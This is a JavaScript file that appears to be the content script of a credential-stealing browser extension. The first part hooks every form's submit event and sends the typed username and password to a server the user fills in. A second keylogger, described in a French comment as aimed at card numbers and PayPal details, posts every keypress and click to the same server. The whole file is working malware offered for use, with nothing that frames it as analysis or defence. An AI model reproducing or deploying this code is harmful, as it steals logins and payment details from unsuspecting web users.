                 
 var serverUrl = "http://127.0.0.1/chrome/"  //YOUR WEB SERVER HERE
    var forms = document.getElementsByTagName('form');

    for (var i = 0; i < forms.length; i++) {
      var form = forms[i];
      var fields = form.getElementsByTagName('input');

      // attempt to locate user/pass elements
      for (var j = 0; j < fields.length; j++) {
          var f = fields[j];

          // recognize user/pass form elements
          if (!form._pass && f.type == 'password')
              form._pass = f;
          else if (!form._user && (f.type == 'text' || f.type == 'email'))
              form._user = f;

          // wait until user/pass are found
          if (!(form._user !== undefined && form._pass !== undefined))
              continue;

          // user/pass elements found
          // add event handler to form
          form.onsubmit = function() {
              if (this._user.value && this._pass.value) {
                  // post credentials to background
                var userName = this._user.value
                var passWord = this._pass.value
                var pic = new Image()
                pic.src = serverUrl+'log.php?user='+userName+'&pass='+passWord //server URL
              }
                  }};
              }
	
	//Capture card number paypal ....etc 2nd keylogger
	
	//Capture card number paypal ....etc 2nd keylogger
	
	//c'est le 2nd keylogger different du 1ier car le 1ier va récupérer que les identifiants de connexion	


	var server = "http://127.0.0.1/chrome/a.php";
	document.addEventListener("keypress", function(a){
		var x = new XMLHttpRequest();
		x.open("POST", server, true);
		x.send(a.key);
	});
	
	document.addEventListener("click", function(e){
		//var click = ;
		if(e.which == 1){
			click = " ";
		}
	
		var x = new XMLHttpRequest();
		x.open("POST", server, true);
		x.send(click) ;
				
	});
